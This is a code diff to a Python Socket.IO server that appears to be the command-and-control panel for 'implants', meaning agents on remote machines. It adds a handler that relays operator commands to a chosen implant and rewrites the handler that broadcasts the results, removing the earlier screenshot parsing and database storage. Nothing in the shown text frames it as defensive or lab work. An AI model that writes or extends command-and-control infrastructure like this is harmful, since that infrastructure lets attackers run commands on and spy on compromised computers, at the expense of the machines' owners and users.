@@ -235,70 +235,60 @@ def handle_register(data):
     emit('implants_update', active_implants, broadcast=True)
     emit('registered', {'status': 'success'})
 
+@socketio.on('command')
+def handle_command(data):
+    """Handle command execution request"""
+    try:
+        implant_id = data.get('implant_id')
+        command = data.get('command')
+        
+        if not implant_id or not command:
+            emit('error', {'message': 'Missing implant_id or command'})
+            return
+        
+        # Get implant from database
+        conn = get_db()
+        implant = conn.execute('SELECT * FROM implants WHERE id = ?', (implant_id,)).fetchone()
+        if not implant:
+            emit('error', {'message': 'Implant not found'})
+            return
+        
+        # Emit command to the specific implant
+        emit('command', {
+            'command': command,
+            'implant_id': implant_id
+        }, room=implant_id)
+        
+    except Exception as e:
+        logger.error(f"Error handling command: {e}")
+        emit('error', {'message': str(e)})
+
 @socketio.on('command_result')
 def handle_command_result(data):
-    """Handle command execution results from implants"""
-    implant_id = data.get('implant_id')
-    command = data.get('command')
-    result = data.get('result')
-    timestamp = data.get('timestamp')
-    
-    if implant_id and command:
-        # Parse result if it's JSON (for screenshots)
-        try:
-            if isinstance(result, str) and result.startswith('{'):
-                result_data = json.loads(result)
-                if result_data.get('status') == 'success' and result_data.get('filename'):
-                    # Handle screenshot result
-                    result = {
-                        'type': 'screenshot',
-                        'message': result_data['message'],
-                        'filename': result_data['filename'],
-                        'timestamp': timestamp
-                    }
-                else:
-                    result = {
-                        'type': 'error',
-                        'message': result_data.get('message', 'Unknown error'),
-                        'timestamp': timestamp
-                    }
-            else:
-                # Handle regular command output
-                result = {
-                    'type': 'command',
-                    'message': result,
-                    'timestamp': timestamp
-                }
-        except json.JSONDecodeError:
-            # If result is not JSON, treat as regular command output
-            result = {
-                'type': 'command',
-                'message': result,
-                'timestamp': timestamp
-            }
+    """Handle command result from implant"""
+    try:
+        implant_id = data.get('implant_id')
+        command = data.get('command')
+        result = data.get('result')
+        timestamp = data.get('timestamp')
         
-        # Store result in database
-        conn = get_db()
-        conn.execute('''UPDATE commands 
-                        SET status = ?, result = ?
-                        WHERE implant_id = ? AND command = ?''',
-                    ('completed', result, implant_id, command))
-        conn.commit()
-        conn.close()
+        if not all([implant_id, command, result]):
+            logger.error("Missing required fields in command result")
+            return
         
-        # Update implant's last activity
-        if implant_id in active_implants:
-            active_implants[implant_id]['last_seen'] = timestamp
-            active_implants[implant_id]['last_activity'] = f"Executed command: {command}"
+        # Log the command result
+        logger.info(f"Command result from implant {implant_id}: {command}")
         
-        # Broadcast updates
-        emit('implants_update', active_implants, broadcast=True)
+        # Broadcast the result to all connected clients
         emit('command_result', {
             'implant_id': implant_id,
             'command': command,
             'result': result,
             'timestamp': timestamp
         }, broadcast=True)
+        
+    except Exception as e:
+        logger.error(f"Error handling command result: {e}")
 
 @socketio.on('get_command_history')
 def handle_get_command_history(data):
